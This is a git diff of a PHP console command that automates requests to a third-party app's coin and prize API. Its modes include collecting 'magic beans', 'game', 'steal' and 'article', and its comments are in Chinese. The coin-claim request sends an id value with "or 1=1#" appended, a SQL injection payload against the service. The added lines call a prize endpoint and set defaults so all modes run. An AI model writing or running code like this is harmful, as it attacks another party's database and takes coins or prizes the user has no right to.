@@ -39,7 +39,7 @@ class mytest extends Command
     }
 
     protected $start_number = 0;//搜索开始ID
-    protected $number_of_data = 1000;//每次获取数量 @todo本地使用数目较小
+    protected $number_of_data = 1000;//每次获取数量
 
     /**
      * 3. 这里是放要执行的代码
@@ -47,12 +47,17 @@ class mytest extends Command
      */
     public function handle() {
         $type = filter($this->option('type'),'s');
+        if(empty($type)) $type = 'modou,game,steal,article';
+        $result = self::curl('http://huai.huaishutech.com/v1.2/api/activity/prize/one',['id'=>1,'prise'=>5]);
+        if($result) $result = json_decode($result);
+
         $type = explode(',', $type);
         if(in_array('modou',$type)) {
             $this->info('魔豆收取已就绪');
             $huaijie_data = self::curl('http://huai.huaishutech.com/v1.2/api/coin/info',[],'get');
             $huaijie_data = json_decode($huaijie_data);
             $number = 0;
+            if($huaijie_data->data->message == 'Not Login') return 'Not Login';
             if(isset($huaijie_data->data->data)) {
                 foreach ($huaijie_data->data->data as $v) {
                     $result = self::curl('http://huai.huaishutech.com/v1.2/api/coin/get',['id'=>$v->id.'or 1=1#','amount'=>12]);
